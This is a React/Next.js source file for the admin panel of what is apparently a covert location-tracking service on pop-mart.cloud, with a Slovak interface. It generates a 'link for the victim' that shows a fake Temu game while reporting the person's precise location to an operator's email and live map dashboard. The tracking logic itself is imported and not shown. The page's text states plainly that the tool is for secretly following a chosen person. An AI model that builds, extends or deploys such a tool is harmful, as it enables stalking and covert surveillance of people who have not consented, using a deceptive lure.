import { useState } from 'react';
import { v4 as uuidv4 } from 'uuid';
import { createTrackingLink } from '../lib/trackingLink';
import { Copy, ExternalLink, ShieldCheck, MapPin, Eye, Mail, LogOut } from 'lucide-react';
import Head from 'next/head';

export default function HomePage() {
  const [trackingLink, setTrackingLink] = useState('');
  const [targetEmail, setTargetEmail] = useState('');
  const [isGenerating, setIsGenerating] = useState(false);
  const [errorText, setErrorText] = useState('');
  const [copyStatus, setCopyStatus] = useState({ victim: false, viewer: false });

  const handleGenerate = async (e) => {
    e?.preventDefault();
    if (!targetEmail.includes('@')) {
      setErrorText('Zadajte platnú e-mailovú adresu.');
      return;
    }
    setErrorText('');
    setIsGenerating(true);

    try {
      const token = uuidv4();
      const origin = typeof window !== 'undefined' ? window.location.origin : 'https://temu.pop-mart.cloud';

      const res = await fetch('/api/session/init', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ token, email: targetEmail })
      });

      if (!res.ok) {
        throw new Error('Nepodarilo sa vytvoriť reláciu');
      }

      setTrackingLink(createTrackingLink(origin, token));
    } catch (err) {
      setErrorText('Chyba servera pri vytváraní linku.');
      console.error(err);
    } finally {
      setIsGenerating(false);
    }
  };

  const copyToClipboard = async (text, type) => {
    try {
      await navigator.clipboard.writeText(text);
      setCopyStatus({ ...copyStatus, [type]: true });
      setTimeout(() => setCopyStatus({ ...copyStatus, [type]: false }), 2000);
    } catch (err) {
      console.error('Failed to copy!', err);
    }
  };

  const logout = () => {
    document.cookie = 'auth_token=; Max-Age=0; Path=/';
    window.location.href = '/login';
  };

  const resetForm = () => {
    setTrackingLink('');
    setTargetEmail('');
    setErrorText('');
  };

  const viewerLink = trackingLink ? `${trackingLink}&view=1` : '';

  return (
    <div className="min-h-screen bg-white text-slate-900 selection:bg-black selection:text-white">
      <Head>
        <title>Temu Tracker Admin | Light Panel</title>
        <meta name="viewport" content="width=device-width, initial-scale=1" />
      </Head>

      <style jsx global>{`
        @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700&display=swap');
        body { font-family: 'Outfit', sans-serif; background: #ffffff; margin: 0; color: #0f172a; }
        .glass-card {
          background: #ffffff;
          border: 1px solid #e2e8f0;
          border-radius: 24px;
          box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05), 0 2px 4px -2px rgba(0, 0, 0, 0.05);
          transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }
        .glass-card:hover {
          box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 8px 10px -6px rgba(0, 0, 0, 0.1);
        }
        .animate-fade-in {
          animation: fadeIn 0.8s ease-out forwards;
        }
        @keyframes fadeIn {
          from { opacity: 0; transform: translateY(20px); }
          to { opacity: 1; transform: translateY(0); }
        }
        .button-primary {
          background: #000000;
          color: #ffffff;
          transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }
        .button-primary:hover {
          background: #1e293b;
          transform: translateY(-2px);
          box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
        }
        .button-secondary {
          background: #f8fafc;
          border: 1px solid #e2e8f0;
          color: #475569;
          transition: all 0.2s;
        }
        .button-secondary:hover {
          background: #f1f5f9;
          color: #0f172a;
          border-color: #cbd5e1;
        }
      `}</style>

      <nav className="border-b border-slate-100 py-4 px-6 mb-8">
        <div className="max-w-4xl mx-auto flex justify-between items-center">
          <div className="flex items-center gap-2 font-bold text-xl tracking-tight">
            <div className="w-8 h-8 bg-black rounded-lg flex items-center justify-center">
              <ShieldCheck className="text-white" size={18} />
            </div>
            <span>pop-mart<span className="text-slate-400">.cloud</span></span>
          </div>
          <button
            onClick={logout}
            className="flex items-center gap-2 text-sm font-semibold text-slate-500 hover:text-red-600 transition-colors"
          >
            <LogOut size={16} />
            <span>Odhlásiť sa</span>
          </button>
        </div>
      </nav>

      <main className="max-w-4xl mx-auto px-6 py-6 animate-fade-in">
        <header className="text-center mb-16">
          <div className="inline-flex items-center gap-2 bg-slate-100 text-slate-600 px-4 py-2 rounded-full text-sm font-semibold mb-6 border border-slate-200">
            <Lock size={14} className="text-black" />
            <span>Zabezpečená administrácia</span>
          </div>
          <h1 className="text-5xl md:text-6xl font-bold mb-6 tracking-tight text-black">
            Tracker <span className="text-slate-400">Generator</span>
          </h1>
          <p className="text-slate-500 text-lg md:text-xl max-w-2xl mx-auto leading-relaxed font-light">
            Generujte bezpečné odkazy pre overenie polohy. Systém presmeruje obeť na Temu hernú kampaň.
          </p>
        </header>

        {!trackingLink ? (
          <form onSubmit={handleGenerate} className="glass-card p-10 max-w-md mx-auto relative overflow-hidden group">
            <div className="relative">
              <div className="flex items-center gap-3 mb-4">
                <div className="p-2 bg-slate-900 text-white rounded-lg">
                  <Mail size={20} />
                </div>
                <h3 className="text-xl font-bold text-black">Nastavenie relácie</h3>
              </div>
              <p className="text-slate-500 text-sm mb-8">Zadajte e-mail, na ktorý chcete dostať upozornenie s presnou polohou užívateľa.</p>

              <div className="mb-8">
                <label className="block text-xs font-bold text-slate-400 uppercase tracking-wider mb-2">Cieľový E-mail</label>
                <input
                  type="email"
                  value={targetEmail}
                  onChange={(e) => setTargetEmail(e.target.value)}
                  placeholder="napr. sef@firma.sk"
                  className="w-full bg-slate-50 border border-slate-200 rounded-xl px-4 py-4 text-black placeholder-slate-400 focus:outline-none focus:border-black focus:ring-1 focus:ring-black transition-all font-mono text-sm"
                  required
                />
              </div>

              {errorText && <p className="text-red-600 text-sm mb-4 font-semibold">{errorText}</p>}

              <button
                type="submit"
                disabled={isGenerating}
                className="w-full button-primary py-4 rounded-xl flex items-center justify-center gap-2 font-bold transition-all disabled:opacity-70 disabled:cursor-not-allowed"
              >
                {isGenerating ? (
                  <span className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></span>
                ) : (
                  <>Vygenerovať bezpečný odkaz</>
                )}
              </button>
            </div>
          </form>
        ) : (
          <div className="grid gap-8 md:grid-cols-2">
            {/* Victim Section */}
            <div className="glass-card p-8 flex flex-col justify-between group border-l-4 border-l-slate-900">
              <div>
                <div className="flex items-center gap-3 mb-6">
                  <div className="p-3 bg-slate-100 text-black rounded-xl border border-slate-200">
                    <MapPin size={24} />
                  </div>
                  <h3 className="text-xl font-bold text-black">1. Link pre Obeť</h3>
                </div>
                <p className="text-slate-500 text-sm mb-4 leading-relaxed">
                  Tento odkaz pošli osobe, ktorú chceš sledovať. Po otvorení sa jej zobrazí Temu hra.
                </p>
                <div className="bg-slate-50 p-4 rounded-xl font-mono text-xs border border-slate-200 break-all mb-6 text-slate-700 font-bold whitespace-pre-wrap">
                  {trackingLink}
                </div>
              </div>
              <button
                onClick={() => copyToClipboard(trackingLink, 'victim')}
                className={`w-full py-4 rounded-xl flex items-center justify-center gap-2 font-bold transition-all ${copyStatus.victim ? 'bg-emerald-500 text-white shadow-lg shadow-emerald-200' : 'button-primary'
                  }`}
              >
                {copyStatus.victim ? (
                  <>OK! Skopírované</>
                ) : (
                  <>
                    <Copy size={20} />
                    <span>Kopírovať Link</span>
                  </>
                )}
              </button>
            </div>

            {/* Viewer Section */}
            <div className="glass-card p-8 flex flex-col justify-between border-l-4 border-l-emerald-500">
              <div>
                <div className="flex items-center gap-3 mb-6">
                  <div className="p-3 bg-emerald-50 text-emerald-600 rounded-xl border border-emerald-100">
                    <Eye size={24} />
                  </div>
                  <h3 className="text-xl font-bold text-black">2. Tvoj Dashboard</h3>
                </div>
                <p className="text-slate-500 text-sm mb-4 leading-relaxed">
                  Tento odkaz si ulož. Uvidíš mapu v reálnom čase.<br />
                  <span className="text-emerald-600 font-medium">Notifikácie: <b>{targetEmail}</b></span>
                </p>
                <div className="bg-emerald-50/50 p-4 rounded-xl font-mono text-xs border border-emerald-100 break-all mb-6 text-emerald-700 font-bold whitespace-pre-wrap">
                  {viewerLink}
                </div>
              </div>
              <div className="flex gap-3">
                <button
                  onClick={() => copyToClipboard(viewerLink, 'viewer')}
                  className={`flex-1 py-4 rounded-xl flex items-center justify-center gap-2 font-bold transition-all ${copyStatus.viewer ? 'bg-emerald-500 text-white shadow-lg shadow-emerald-200' : 'button-secondary'
                    }`}
                >
                  <Copy size={18} />
                  <span>Kopírovať Info</span>
                </button>
                <a
                  href={viewerLink}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="p-4 rounded-xl bg-slate-100 text-slate-800 hover:bg-slate-200 border border-slate-200 transition-all flex items-center justify-center"
                >
                  <ExternalLink size={20} />
                </a>
              </div>
            </div>
          </div>
        )}

        {trackingLink && (
          <footer className="mt-24 pt-8 border-t border-slate-100 text-center">
            <button
              onClick={resetForm}
              className="px-6 py-2 rounded-full bg-slate-100 text-slate-500 hover:bg-slate-900 hover:text-white text-sm font-bold transition-all flex items-center gap-2 mx-auto border border-slate-200"
            >
              Vytvoriť novú reláciu
            </button>
          </footer>
        )}
      </main>

      <footer className="py-12 text-center text-slate-400 text-sm">
        <p>© {new Date().getFullYear()} pop-mart.cloud • Zabezpečený lokačný panel</p>
      </footer>
    </div>
  );
}

// Add Lock icon for header
function Lock({ size, className }) {
  return (
    <svg
      xmlns="http://www.w3.org/2000/svg"
      width={size}
      height={size}
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      strokeWidth="2"
      strokeLinecap="round"
      strokeLinejoin="round"
      className={className}
    >
      <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
      <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
    </svg>
  );
}
